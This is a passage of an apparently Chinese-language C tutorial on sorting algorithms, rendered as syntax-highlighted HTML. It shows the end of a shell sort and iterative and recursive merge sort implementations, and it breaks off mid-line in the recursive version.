class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> len<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token comment\">// 计算初始间隔</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> gap <span class=\"token operator\">=</span> len <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> gap <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> gap <span class=\"token operator\">/=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token comment\">// 对每个间隔进行插入排序</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> gap<span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> len<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token keyword\">int</span> temp <span class=\"token operator\">=</span> arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 当前待插入的元素</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token comment\">// 移动大于 temp 的元素</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">>=</span> gap <span class=\"token operator\">&amp;&amp;</span> arr<span class=\"token punctuation\">[</span>j <span class=\"token operator\">-</span> gap<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> temp<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                arr<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> arr<span class=\"token punctuation\">[</span>j <span class=\"token operator\">-</span> gap<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                j <span class=\"token operator\">-=</span> gap<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            arr<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> temp<span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 插入元素到正确位置</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>3. 归并排序</p>\n<p>迭代法</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 函数声明</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">min</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">merge_sort</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">int</span> arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token number\">22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">55</span><span class=\"token punctuation\">,</span> <span class=\"token number\">89</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">37</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">35</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">70</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">int</span> len <span class=\"token operator\">=</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 计算数组长度</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token function\">merge_sort</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">,</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 调用归并排序函数</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token comment\">// 打印排序后的数组</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> len<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d \"</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">// 返回两个数中的最小值</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">min</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> y<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">return</span> x <span class=\"token operator\">&lt;</span> y <span class=\"token operator\">?</span> x <span class=\"token operator\">:</span> y<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre> </pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">// 归并排序函数</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">merge_sort</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> len<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">int</span><span class=\"token operator\">*</span> a <span class=\"token operator\">=</span> arr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">int</span><span class=\"token operator\">*</span> b <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>len <span class=\"token operator\">*</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre> </pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">// 检查内存分配是否成功</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Memory allocation failed\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span>EXIT_FAILURE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> seg <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> seg <span class=\"token operator\">&lt;</span> len<span class=\"token punctuation\">;</span> seg <span class=\"token operator\">+=</span> seg<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> start <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> start <span class=\"token operator\">&lt;</span> len<span class=\"token punctuation\">;</span> start <span class=\"token operator\">+=</span> seg <span class=\"token operator\">+</span> seg<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            <span class=\"token keyword\">int</span> low <span class=\"token operator\">=</span> start<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            <span class=\"token keyword\">int</span> mid <span class=\"token operator\">=</span> <span class=\"token function\">min</span><span class=\"token punctuation\">(</span>start <span class=\"token operator\">+</span> seg<span class=\"token punctuation\">,</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token keyword\">int</span> high <span class=\"token operator\">=</span> <span class=\"token function\">min</span><span class=\"token punctuation\">(</span>start <span class=\"token operator\">+</span> seg <span class=\"token operator\">+</span> seg<span class=\"token punctuation\">,</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token keyword\">int</span> k <span class=\"token operator\">=</span> low<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token keyword\">int</span> start1 <span class=\"token operator\">=</span> low<span class=\"token punctuation\">,</span> end1 <span class=\"token operator\">=</span> mid<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            <span class=\"token keyword\">int</span> start2 <span class=\"token operator\">=</span> mid<span class=\"token punctuation\">,</span> end2 <span class=\"token operator\">=</span> high<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token comment\">// 合并两个子数组</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>start1 <span class=\"token operator\">&lt;</span> end1 <span class=\"token operator\">&amp;&amp;</span> start2 <span class=\"token operator\">&lt;</span> end2<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>                b<span class=\"token punctuation\">[</span>k<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a<span class=\"token punctuation\">[</span>start1<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> a<span class=\"token punctuation\">[</span>start2<span class=\"token punctuation\">]</span> <span class=\"token operator\">?</span> a<span class=\"token punctuation\">[</span>start1<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">:</span> a<span class=\"token punctuation\">[</span>start2<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>start1 <span class=\"token operator\">&lt;</span> end1<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>                b<span class=\"token punctuation\">[</span>k<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a<span class=\"token punctuation\">[</span>start1<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>start2 <span class=\"token operator\">&lt;</span> end2<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>                b<span class=\"token punctuation\">[</span>k<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a<span class=\"token punctuation\">[</span>start2<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token comment\">// 交换数组指针</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token keyword\">int</span><span class=\"token operator\">*</span> temp <span class=\"token operator\">=</span> a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        a <span class=\"token operator\">=</span> b<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        b <span class=\"token operator\">=</span> temp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre> </pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token comment\">// 如果 a 和 arr 不相同，则将 a 的内容复制回 arr</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>a <span class=\"token operator\">!=</span> arr<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> len<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>            b<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        b <span class=\"token operator\">=</span> a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 释放内存</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>递归法</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">// 函数声明</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">merge_sort_recursive</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> reg<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> start<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> end<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">merge_sort</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">int</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">int</span> arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token number\">22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">55</span><span class=\"token punctuation\">,</span> <span class=\"token number\">89</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">37</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">35</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">70</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">int</span> len <span class=\"token operator\">=</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 计算数组长度</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre> </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">merge_sort</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">,</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 调用归并排序函数</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre> </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token comment\">// 打印排序后的数组</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> len<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d \"</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre> </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre> </pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">// 递归实现归并排序</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">merge_sort_recursive</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> reg<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> start<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> end<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>start <span class=\"token operator\">>=</span> end<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre> </pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">int</span> mid <span class=\"token operator\">=</span> start <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>end <span class=\"token operator\">-</span> start<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">int</span> start1 <span class=\"token operator\">=</span> start<span class=\"token punctuation\">,</span> end1 <span class=\"token operator\">=</span> mid<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">int</span> start2 <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> end2 <span class=\"token operator\">=</span> end<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre> </pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token function\">merge_sort_recursive</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">,</span> reg<span class=\"token punctuation\">,</span> start1<span class=\"token punctuation\">,</span> end1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token function\">merge_sort_recursive</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">,</span> reg<span class=\"token punctuation\">,</span> start2<span class=\"token punctuation\">,</span> end2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre> </pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">int</span> k <span class=\"token operator\">=</span> start<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>start1 <span class=\"token operator\">&lt;=</span> end1 <span class=\"token operator\">&amp;&amp;</span> start2 <span class=\"token operator\">&lt;=</span> end2<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        reg<span class=\"token punctuation\">[</span>k<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> arr<span class=\"token punctuation\">[</span>start1<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> arr<span class=\"token punctuation\">[</span>start2<span class=\"token punctuation\">]</span> <span class=\"token operator\">?</span> arr<span class=\"token punctuation\">[</span>start1<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">:</span> arr<span class=\"token punctuation\">[</span>start2<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>start1 <span class=\"token operator\">&lt;=</span> end1<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        reg<span class=\"token punctuation\">[</span>k<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> arr<span class=\"token punctuation\">[</span>start1<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>start2 <span class=\"token operator\">&lt;=</span> end2<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        reg<span class=\"token punctuation\">[</span>k<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> arr<span class=\"token punctuation\">[</span>start2<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre> </pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token comment\">// 使用 memcpy 进行数组复制，提高效率</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>arr <span class=\"token operator\">+</span> start<span class=\"token punctuation\">,</span> reg <span class=\"token operator\">+</span> start<span class=\"token punctuation\">,</span> 